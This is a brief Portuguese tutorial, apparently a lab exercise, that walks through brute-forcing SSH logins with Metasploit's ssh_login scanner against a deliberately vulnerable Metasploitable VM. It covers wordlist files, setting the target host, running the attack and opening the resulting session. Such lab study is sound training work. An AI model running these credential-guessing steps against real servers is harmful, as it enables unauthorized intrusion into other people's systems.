@@ -1,0 +1,30 @@
+--Explorando Falhas no SSH--
+Primeiramente temos que ter duas máquinas virtuais na mesma rede.
+Para realizarmos o ataque utilizamos uma máquina com Kali Linux(Atacante) e uma com Metasploitable(Receptora).
+O Metasploitable é uma máquina virtual intencionalmente vulnerável que roda uma versão do Linux Ubuntu.
+Ela é provida de dezenas de serviços e softwares repletos de vulnerabilidades, para ser usada para estudo e prática na segurança.
+A primeira coisa a se fazer e entrar no Metasploitable e pegar o ip da mesma usando o seguinte comando:
+-ip addr
+Em meu caso específico o ip era 192.168.56.103/24.
+Após isso vamos para o Kali Linux e escrevemos os seguintes comandos:
+-msfconsole(Interface usada para usar o msf com várias opções de possíveis ataques)
+-search ssh_login(Pesquisa relacionada ao login no ssh)
+-use auxiliary/scanner/ssh/ssh_login
+-info(vai fornecer o que precisar ser feito para continuarmos o processo)
+No caso teremos que criar os seguintes arquivos para fazer as tentativas de login na outra máquina.
+-nano password.txt
+-nano user.txt
+O comando nano serve para criar o arquivo seguido de seu nome seria algo semelhante ao bloco de notas,dentro desses arquivos colocaremos
+os possíveis passwords e users,dentro do arquivo os mesmos devem estar listados por linha um abaixo do outro,posteriormente usaremos um comando
+para usar as combinações dos dois arquivos txt afim de fazer uma invasão.Seguimos com os comandos:
+-set USER_FILE /home/nome da sua máquina kali/user.txt
+-set PASSWORD_FILE /home/nome da sua máquina kali/password.txt
+Com isso ja podemos setar os rhosts com o ip da máquina que atacaremos.
+-set rhost 192.168.56.103
+-exploit(Começo do ataque bruto)
+-sessions(mostrar a sessão iniciada)
+-sessions 1(escolhendo a sessão)
+-ip addr(confirmação de invasão com o ip igual ai setado)
+Extra:
+-ls(para mostrar o que temos de arquivos no outro ps)
+
